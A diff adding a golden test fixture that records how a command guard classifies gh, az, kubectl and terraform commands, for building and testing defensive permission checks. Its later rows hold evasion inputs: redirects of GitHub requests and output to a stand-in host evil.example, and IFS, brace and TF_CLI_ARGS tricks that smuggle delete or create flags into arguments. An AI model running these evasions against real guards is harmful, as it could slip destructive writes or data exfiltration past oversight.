@@ -1,0 +1,439 @@
+# guard<TAB>prepare<TAB>command. Read by tests/scripts/test-external-write-golden.sh.
+# A row here changes only when a classification is changed on purpose.
+
+# Same answers as before classify() replaced the separate decision functions.
+allow	refuse:command is not an allowlisted external mutation	gh pr checks
+allow	refuse:command is not an allowlisted external mutation	gh pr diff
+allow	refuse:command is not an allowlisted external mutation	gh pr list
+allow	refuse:command is not an allowlisted external mutation	gh pr status
+allow	refuse:command is not an allowlisted external mutation	gh pr view
+allow	refuse:command is not an allowlisted external mutation	gh pr watch
+allow	refuse:command is not an allowlisted external mutation	gh gist clone x
+allow	refuse:command is not an allowlisted external mutation	gh pr checkout x
+allow	refuse:command is not an allowlisted external mutation	gh release download x
+allow	refuse:command is not an allowlisted external mutation	gh repo clone x
+allow	refuse:command is not an allowlisted external mutation	gh run download x
+allow	refuse:command is not an allowlisted external mutation	gh --help
+allow	refuse:command is not an allowlisted external mutation	gh --version
+allow	refuse:command is not an allowlisted external mutation	gh -h
+block:mutation	accept:github	gh cache delete x -R owner/example
+block:mutation	refuse:payload file does not exist: x	gh gist create x -R owner/example
+block:mutation	accept:github	gh gist edit x -R owner/example
+block:mutation	accept:github	gh issue close x -R owner/example
+block:mutation	accept:github	gh issue comment x -R owner/example
+block:mutation	accept:github	gh label create x -R owner/example
+block:mutation	accept:github	gh pr merge x -R owner/example
+block:mutation	accept:github	gh pr ready x -R owner/example
+block:mutation	accept:github	gh pr review x -R owner/example
+block:mutation	accept:github	gh release reopen x -R owner/example
+block:mutation	accept:github	gh repo set x -R owner/example
+block:mutation	accept:github	gh secret set x -R owner/example
+block:mutation	accept:github	gh variable set x -R owner/example
+allow	refuse:command is not an allowlisted external mutation	gh search code x
+allow	refuse:command is not an allowlisted external mutation	gh search commits x
+allow	refuse:command is not an allowlisted external mutation	gh search issues x
+allow	refuse:command is not an allowlisted external mutation	gh search prs x
+allow	refuse:command is not an allowlisted external mutation	gh search repos x
+allow	refuse:command is not an allowlisted external mutation	gh
+allow	refuse:command is not an allowlisted external mutation	gh help
+allow	refuse:command is not an allowlisted external mutation	gh status
+allow	refuse:command is not an allowlisted external mutation	gh auth status
+allow	refuse:command is not an allowlisted external mutation	gh auth switch
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh auth token
+block:mutation	accept:github	gh workflow run x.yml -R owner/example
+allow	refuse:command is not an allowlisted external mutation	gh workflow list
+block:mutation	accept:azure	az group add
+block:mutation	accept:azure	az group apply
+block:mutation	accept:azure	az group assign
+block:mutation	accept:azure	az group build
+block:mutation	accept:azure	az group cancel
+block:mutation	accept:azure	az group create
+block:mutation	accept:azure	az group delete
+block:mutation	accept:azure	az group import
+block:mutation	accept:azure	az group invoke-action
+block:mutation	accept:azure	az group purge
+block:mutation	accept:azure	az group remove
+block:mutation	accept:azure	az group restart
+block:mutation	accept:azure	az group resume
+block:mutation	accept:azure	az group set
+block:mutation	accept:azure	az group start
+block:mutation	accept:azure	az group stop
+block:mutation	accept:azure	az group swap
+block:mutation	accept:azure	az group unassign
+block:mutation	accept:azure	az group update
+allow	refuse:command is not an allowlisted external mutation	az group check
+allow	refuse:command is not an allowlisted external mutation	az group describe
+allow	refuse:command is not an allowlisted external mutation	az group exists
+allow	refuse:command is not an allowlisted external mutation	az group get
+allow	refuse:command is not an allowlisted external mutation	az group list
+allow	refuse:command is not an allowlisted external mutation	az group query
+allow	refuse:command is not an allowlisted external mutation	az group show
+allow	refuse:command is not an allowlisted external mutation	az group status
+allow	refuse:command is not an allowlisted external mutation	az group view
+allow	refuse:command is not an allowlisted external mutation	az group what-if
+allow	refuse:command is not an allowlisted external mutation	az account list
+allow	refuse:command is not an allowlisted external mutation	az acr list
+allow	refuse:command is not an allowlisted external mutation	az devops list
+allow	refuse:command is not an allowlisted external mutation	az keyvault list
+allow	refuse:command is not an allowlisted external mutation	az pipelines list
+allow	refuse:command is not an allowlisted external mutation	az vm list
+allow	refuse:command is not an allowlisted external mutation	az account set
+allow	refuse:command is not an allowlisted external mutation	az cloud set
+block:mutation	accept:kubernetes	kubectl annotate x
+block:mutation	accept:kubernetes	kubectl apply x
+block:mutation	accept:kubernetes	kubectl cordon x
+block:mutation	accept:kubernetes	kubectl create x
+block:mutation	accept:kubernetes	kubectl delete x
+block:mutation	accept:kubernetes	kubectl drain x
+block:mutation	accept:kubernetes	kubectl edit x
+block:mutation	accept:kubernetes	kubectl label x
+block:mutation	accept:kubernetes	kubectl patch x
+block:mutation	accept:kubernetes	kubectl replace x
+block:mutation	accept:kubernetes	kubectl scale x
+block:mutation	accept:kubernetes	kubectl taint x
+block:mutation	accept:kubernetes	kubectl uncordon x
+block:mutation	accept:kubernetes	kubectl rollout pause deploy/x
+block:mutation	accept:kubernetes	kubectl rollout restart deploy/x
+block:mutation	accept:kubernetes	kubectl rollout resume deploy/x
+block:mutation	accept:kubernetes	kubectl rollout undo deploy/x
+allow	refuse:command is not an allowlisted external mutation	kubectl rollout status deploy/x
+allow	refuse:command is not an allowlisted external mutation	kubectl rollout history deploy/x
+allow	refuse:command is not an allowlisted external mutation	kubectl api-resources pods
+allow	refuse:command is not an allowlisted external mutation	kubectl cluster-info pods
+allow	refuse:command is not an allowlisted external mutation	kubectl describe pods
+allow	refuse:command is not an allowlisted external mutation	kubectl events pods
+allow	refuse:command is not an allowlisted external mutation	kubectl explain pods
+allow	refuse:command is not an allowlisted external mutation	kubectl get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl logs pods
+allow	refuse:command is not an allowlisted external mutation	kubectl top pods
+allow	refuse:command is not an allowlisted external mutation	kubectl version pods
+allow	refuse:command is not an allowlisted external mutation	kubectl config current-context
+allow	refuse:command is not an allowlisted external mutation	kubectl config get-contexts
+allow	refuse:command is not an allowlisted external mutation	kubectl auth can-i get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl --as v get pods
+block:mutation	accept:kubernetes	kubectl --as v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --as-group v get pods
+block:mutation	accept:kubernetes	kubectl --as-group v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --as-uid v get pods
+block:mutation	accept:kubernetes	kubectl --as-uid v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --cache-dir v get pods
+block:mutation	accept:kubernetes	kubectl --cache-dir v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --certificate-authority v get pods
+block:mutation	accept:kubernetes	kubectl --certificate-authority v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --client-certificate v get pods
+block:mutation	accept:kubernetes	kubectl --client-certificate v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --client-key v get pods
+block:mutation	accept:kubernetes	kubectl --client-key v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --cluster v get pods
+block:mutation	accept:kubernetes	kubectl --cluster v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --context v get pods
+block:mutation	accept:kubernetes	kubectl --context v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --kubeconfig v get pods
+block:mutation	accept:kubernetes	kubectl --kubeconfig v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --namespace v get pods
+block:mutation	accept:kubernetes	kubectl --namespace v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --password v get pods
+block:mutation	accept:kubernetes	kubectl --password v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --profile v get pods
+block:mutation	accept:kubernetes	kubectl --profile v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --profile-output v get pods
+block:mutation	accept:kubernetes	kubectl --profile-output v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --proxy-url v get pods
+block:mutation	accept:kubernetes	kubectl --proxy-url v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --request-timeout v get pods
+block:mutation	accept:kubernetes	kubectl --request-timeout v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --server v get pods
+block:mutation	accept:kubernetes	kubectl --server v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --tls-server-name v get pods
+block:mutation	accept:kubernetes	kubectl --tls-server-name v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --token v get pods
+block:mutation	accept:kubernetes	kubectl --token v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --user v get pods
+block:mutation	accept:kubernetes	kubectl --user v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --username v get pods
+block:mutation	accept:kubernetes	kubectl --username v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --v v get pods
+block:mutation	accept:kubernetes	kubectl --v v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl -n v get pods
+block:mutation	accept:kubernetes	kubectl -n v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl -s v get pods
+block:mutation	accept:kubernetes	kubectl -s v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl -v v get pods
+block:mutation	accept:kubernetes	kubectl -v v delete pod x
+allow	refuse:command is not an allowlisted external mutation	kubectl --disable-compression get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl --help get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl --insecure-skip-tls-verify get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl --match-server-version get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl --warnings-as-errors get pods
+allow	refuse:command is not an allowlisted external mutation	kubectl -h get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-backtrace-at v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-backtrace-at v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-dir v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-dir v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-file v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-file v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-file-max-size v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-file-max-size v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-flush-frequency v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-flush-frequency v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --output v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --selector v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --selector v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --stderrthreshold v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --stderrthreshold v delete pod x
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --vmodule v get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --vmodule v delete pod x
+block:mutation	accept:terraform	terraform apply
+block:mutation	accept:terraform	terraform destroy
+block:mutation	accept:terraform	terraform import x y
+allow	refuse:command is not an allowlisted external mutation	terraform fmt
+allow	refuse:command is not an allowlisted external mutation	terraform graph
+allow	refuse:command is not an allowlisted external mutation	terraform plan
+allow	refuse:command is not an allowlisted external mutation	terraform providers
+allow	refuse:command is not an allowlisted external mutation	terraform validate
+allow	refuse:command is not an allowlisted external mutation	terraform version
+allow	refuse:command is not an allowlisted external mutation	terraform init
+block:mutation	accept:terraform	terraform init -migrate-state
+block:mutation	accept:terraform	terraform init -force-copy
+allow	refuse:command is not an allowlisted external mutation	terraform output
+allow	refuse:command is not an allowlisted external mutation	terraform show
+allow	refuse:command is not an allowlisted external mutation	terraform state list
+allow	refuse:command is not an allowlisted external mutation	terraform state show x
+allow	refuse:command is not an allowlisted external mutation	terraform workspace list
+allow	refuse:command is not an allowlisted external mutation	terraform workspace show
+allow	refuse:command is not an allowlisted external mutation	terraform --help
+allow	refuse:command is not an allowlisted external mutation	terraform --version
+allow	refuse:command is not an allowlisted external mutation	terraform -help
+allow	refuse:command is not an allowlisted external mutation	terraform -version
+block:mutation	accept:confluence	python3 confluence-publish.py attach --plan p.json
+allow	refuse:command is not an allowlisted external mutation	python3 confluence-publish.py render
+allow	refuse:command is not an allowlisted external mutation	az account set --subscription '<name>'
+allow	refuse:command is not an allowlisted external mutation	az account set --subscription example
+block:unrecognized	refuse:command is not an allowlisted external mutation	az account set --subscription prod-keys
+allow	refuse:command is not an allowlisted external mutation	ssh host gh pr view 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	ssh host kubectl -o json get pods
+block:unrecognized	refuse:command is not an allowlisted external mutation	ssh host gh -R owner/example pr view 1
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl -o json get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl -o delete get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl -o json get secrets
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl -o json config use-context prod
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl -l app=x get pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl -l app=x delete pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --selector app=x delete pods
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --log-dir d exec pod -- ls
+block:unrecognized	refuse:kubectl has a global option this guard does not recognize	kubectl --weird x run y
+allow	refuse:command is not an allowlisted external mutation	kubectl get pods -o json
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl set env deploy/x A=b
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl debug pod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl expose deploy/x
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl autoscale deploy/x
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl attach pod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl proxy
+allow	refuse:command is not an allowlisted external mutation	kubectl get run
+allow	refuse:command is not an allowlisted external mutation	kubectl describe pod exec
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context prod extra
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context prod --kubeconfig x
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context -x
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context secrets
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context $CTX
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl --context $X config use-context prod
+block:unparsed	refuse:command is not an allowlisted external mutation	kubectl config use-context "$(cat ctx)"
+block:unrecognized	refuse:command is not an allowlisted external mutation	cat a | xargs kubectl config use-context
+block:mutation	refuse:command is not an allowlisted external mutation	kubectl config use-context prod && kubectl delete pod x
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config set-context prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config set current-context prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config delete-context prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select -or-create prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select -or-create=true prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select --or-create prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select prod -or-create
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select prod other
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select $WS
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select {-or-create,prod}
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform -chdir=$D workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	cat a | xargs terraform workspace select
+block:unrecognized	refuse:command is not an allowlisted external mutation	cat a | xargs terraform workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	A=-or-create; terraform workspace select $A prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	TF_CLI_ARGS_workspace_select=-or-create terraform workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	export TF_CLI_ARGS=-or-create; terraform workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	env TF_CLI_ARGS=-or-create terraform workspace select prod
+allow	refuse:command is not an allowlisted external mutation	TF_CLI_ARGS=-no-color terraform plan
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace new prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace delete prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform state mv a b
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform state push s.tfstate
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform untaint aws_x.y
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform force-unlock id
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x --method OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -XOPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X options
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api -X OPTIONS x
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X OPTIONS -f a=b
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X OPTIONS --input f.json
+block:mutation	accept:github	gh api x -X OPTIONS -X DELETE
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api graphql -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api /graphql -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api GraphQL -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api graphql -X GET --input f.json
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input -
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input=f.json
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x --method GET --input f.json
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input f.json -f a=b
+block:mutation	refuse:payload file does not exist: f.json	gh api x -X GET --input f.json -X DELETE
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X HEAD --input f.json
+block:mutation	refuse:payload file does not exist: f.json	gh api x --input f.json
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input $F
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api $EP -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input {f,-XDELETE}
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input f*.json
+block:mutation	refuse:command is not an allowlisted external mutation	A="f -XDELETE"; gh api x -X GET --input $A
+block:unrecognized	refuse:command is not an allowlisted external mutation	cat a | xargs gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	cat a | xargs gh api x -X GET --input
+block:unparsed	refuse:command is not an allowlisted external mutation	gh api x -X GET --input "$(cat p)"
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh --repo=owner/example pr merge 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh -Rowner/example pr merge 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh pr --repo=owner/example merge 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh -R owner/example pr view 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh -R owner/example pr close 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh -R owner/example pr checkout 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh -R owner/example issue create
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh pr --repo owner/example view 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh -R owner/example run rerun 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh pr -R owner/example -R owner/example merge 1
+allow	refuse:command is not an allowlisted external mutation	gh run view 1
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh run cancel 1 -R owner/example
+allow	accept:github	gh api graphql -F query=@q.graphql
+allow	refuse:gh api -f/--raw-field does not read files, so query=@q.graph	gh api graphql -f query=@q.graphql
+block:mutation	accept:github	gh api graphql -F query=@m.graphql
+block:mutation	refuse:payload file does not exist: missing.graphql	gh api graphql -F query=@missing.graphql
+allow	accept:github	gh api graphql -F query=@q.graphql -F owner=x
+block:mutation	refuse:command is not an allowlisted external mutation	echo x > q.graphql && gh api graphql -F query=@q.graphql
+block:mutation	refuse:command is not an allowlisted external mutation	cd sub && gh api graphql -F query=@q.graphql
+block:mutation	refuse:command is not an allowlisted external mutation	Q=1 gh api graphql -F query=@q.graphql
+block:mutation	refuse:command is not an allowlisted external mutation	timeout 5 gh api graphql -F query=@q.graphql
+block:mutation	refuse:command is not an allowlisted external mutation	xargs gh api graphql -F query=@q.graphql
+block:mutation	refuse:payload file does not exist: q.graphql	gh api graphql -F query=@q.graphql; gh api graphql -F query=@q.graphql
+block:mutation	accept:github	gh api graphql -F query=@q.graphql > out.json
+block:mutation	accept:github	gh api graphql -F query=@q.graphql | jq .
+block:unrecognized	refuse:command is not an allowlisted external mutation	TF_CLI_ARGS=-or-create bash -c 'terraform workspace select prod'
+block:unrecognized	refuse:command is not an allowlisted external mutation	printf -v TF_CLI_ARGS -- -or-create; export TF_CLI_ARGS; terraform workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api https://example.invalid/x -X GET --input q.graphql
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api https://example.invalid/x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	export tf_cli_args=-or-create; terraform workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	X='d -or-create'; terraform workspace select pro$X
+block:unrecognized	refuse:command is not an allowlisted external mutation	X=' -XDELETE'; gh api x -X GET --input f$X
+block:unrecognized	refuse:command is not an allowlisted external mutation	IFS=:; X='d:-or-create'; terraform workspace select pro$X
+block:unrecognized	refuse:command is not an allowlisted external mutation	IFS=,; X='f,-XDELETE'; gh api x -X GET --input $X
+block:unrecognized	refuse:command is not an allowlisted external mutation	X=dev; printf -v X %s -or-create; terraform workspace select $X
+block:unrecognized	refuse:command is not an allowlisted external mutation	IFS=:; X='prod:--kubeconfig=k'; kubectl config use-context $X
+block:unrecognized	refuse:command is not an allowlisted external mutation	cd "$REPO" && terraform workspace select prod
+
+# Former dead ends: the guard blocked these and prepare refused them.
+# A wrapper the scanner unwraps (ssh) takes the mutation answer of the command inside it.
+# The new read and local forms are allowed only as the whole command, written plainly.
+block:mutation	accept:kubernetes	kubectl --output v delete pod x
+allow	refuse:command is not an allowlisted external mutation	gh api x -X OPTIONS
+allow	refuse:command is not an allowlisted external mutation	gh api x -X GET --input f.json
+allow	refuse:command is not an allowlisted external mutation	kubectl config use-context
+allow	refuse:command is not an allowlisted external mutation	kubectl config use-context prod
+allow	refuse:command is not an allowlisted external mutation	terraform workspace select
+allow	refuse:command is not an allowlisted external mutation	terraform workspace select prod
+block:mutation	accept:github	gh api x -X PURGE
+block:mutation	accept:kubernetes	kubectl -o json delete pod x
+block:mutation	accept:kubernetes	kubectl exec
+block:mutation	accept:kubernetes	kubectl exec pod -- ls
+block:mutation	accept:kubernetes	kubectl cp
+block:mutation	accept:kubernetes	kubectl port-forward
+block:mutation	accept:kubernetes	kubectl set image
+block:mutation	accept:kubernetes	kubectl run
+block:mutation	accept:terraform	terraform taint
+block:mutation	accept:terraform	terraform refresh
+block:mutation	accept:terraform	terraform state rm
+block:mutation	accept:github	gh run rerun 1 -R owner/example
+block:mutation	accept:github	gh pr update-branch 1 -R owner/example
+block:mutation	accept:github	gh -R owner/example pr merge 1
+block:mutation	accept:github	gh pr --repo owner/example merge 1
+block:mutation	refuse:command is not an allowlisted external mutation	find . -exec kubectl exec pod -- ls \;
+block:mutation	refuse:command is not an allowlisted external mutation	ssh host gh -R owner/example pr merge 1
+block:mutation	refuse:command is not an allowlisted external mutation	ssh host terraform state rm aws_x.y
+block:mutation	refuse:command is not an allowlisted external mutation	ssh host kubectl -o json delete pod x
+block:mutation	accept:kubernetes	kubectl -ojson delete pod x
+block:mutation	accept:kubernetes	kubectl -o=json delete pod x
+block:mutation	accept:kubernetes	kubectl --output json delete pod x
+block:mutation	accept:kubernetes	kubectl --output=json delete pod x
+block:mutation	accept:kubernetes	kubectl -o json exec pod -- ls
+block:mutation	accept:kubernetes	kubectl -o json rollout restart deploy/x
+block:mutation	accept:kubernetes	kubectl -o json set image deploy/x a=b
+block:mutation	accept:kubernetes	kubectl --v 6 exec pod -- ls
+block:mutation	accept:kubernetes	kubectl set image deploy/x a=b
+block:mutation	accept:kubernetes	kubectl cp pod:/a b
+block:mutation	accept:kubernetes	kubectl run x --image=y
+block:mutation	accept:kubernetes	kubectl port-forward pod/x 8080:80
+block:mutation	accept:kubernetes	kubectl -n prod exec pod -- ls
+block:mutation	accept:terraform	terraform taint aws_x.y
+block:mutation	accept:terraform	terraform -chdir=infra refresh
+block:mutation	accept:terraform	terraform state rm aws_x.y
+allow	refuse:command is not an allowlisted external mutation	gh api repos/owner/example -X OPTIONS
+block:mutation	accept:github	gh api x -X purge
+block:mutation	accept:github	gh api x -XPURGE
+block:mutation	accept:github	gh api x --method=PURGE
+block:mutation	accept:github	gh api repos/owner/example/pages -X PURGE
+block:mutation	accept:github	gh api graphql -X PURGE
+block:mutation	accept:github	gh --repo owner/example pr merge 1
+block:mutation	accept:github	gh pr -R owner/example merge 1
+block:mutation	refuse:explicit GitHub owner does not match the command target	gh -R unknown/example pr merge 1
+block:mutation	refuse:GitHub mutations are restricted to github.com	gh -R example.com/owner/example pr merge 1
+block:mutation	refuse:GitHub repository selector does not match the PR/issue URL	gh -R owner/example pr merge https://github.com/other/example/pull/1
+block:mutation	refuse:GitHub repository selector does not match the PR/issue URL	gh pr --repo owner/example merge https://github.com/other/example/pull/1
+block:mutation	refuse:GitHub repository selector does not match the PR/issue URL	gh --repo owner/example pr merge https://github.com/other/example/pull/1
+block:mutation	refuse:GitHub repository selector does not match the PR/issue URL	gh pr -R owner/example merge https://github.com/other/example/pull/1
+block:mutation	refuse:GitHub mutation must use exactly one target selector	gh -R owner/example pr merge 1 -R other/example
+block:mutation	refuse:explicit GitHub owner does not match the command target	gh -R other/example pr merge 1
+block:mutation	refuse:payload file does not exist: missing.md	gh -R owner/example pr merge 1 -F missing.md
+block:mutation	refuse:GitHub write names no repository	gh run rerun 1
+block:mutation	refuse:GitHub write names no repository	gh pr update-branch 1
+block:mutation	refuse:GitHub repository selector does not match the PR/issue URL	gh pr update-branch https://github.com/other/example/pull/1 -R owner/example
+
+# The new forms again, with something that can change the destination or the words.
+block:unrecognized	refuse:command is not an allowlisted external mutation	ssh host kubectl config use-context prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl --kubeconfig x config use-context prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	kubectl config use-context prod && kubectl get pods
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform -chdir=infra workspace select prod
+block:unrecognized	refuse:command is not an allowlisted external mutation	terraform workspace select prod && terraform plan
+block:unrecognized	refuse:command is not an allowlisted external mutation	GH_HOST=evil.example gh api x -X GET --input q.graphql
+block:unrecognized	refuse:command is not an allowlisted external mutation	GH_HOST=evil.example gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	export GH_HOST=evil.example; gh api x -X GET --input q.graphql
+block:unrecognized	refuse:command is not an allowlisted external mutation	declare -x GH_HOST=evil.example; gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	env GH_HOST=evil.example gh api x -X GET --input q.graphql
+block:unrecognized	refuse:command is not an allowlisted external mutation	GH_CONFIG_DIR=cfg gh api x -X GET --input q.graphql
+block:unrecognized	refuse:command is not an allowlisted external mutation	XDG_CONFIG_HOME=cfg gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	HOME=cfg gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	APPDATA=cfg gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	USERPROFILE=cfg gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	HTTPS_PROXY=http://evil.example:1 gh api x -X GET --input q.graphql
+block:unrecognized	refuse:command is not an allowlisted external mutation	Set-Item Env:GH_HOST evil.example; gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	cp hosts.yml cfg && gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	bash -c 'gh api x -X OPTIONS'
+block:unrecognized	refuse:command is not an allowlisted external mutation	timeout 5 gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	ssh host gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	find . -exec gh api x -X OPTIONS \;
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X OPTIONS > //evil.example/share/out
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input 'f'-XDELETE
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api 'x'--hostname=evil.example -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input f,-XDELETE
+block:unrecognized	refuse:command is not an allowlisted external mutation	gh api x -X GET --input @f
+block:unrecognized	refuse:command is not an allowlisted external mutation	./gh api x -X OPTIONS
+block:unrecognized	refuse:command is not an allowlisted external mutation	KUBECONFIG=//evil.example/share/k kubectl config use-context prod
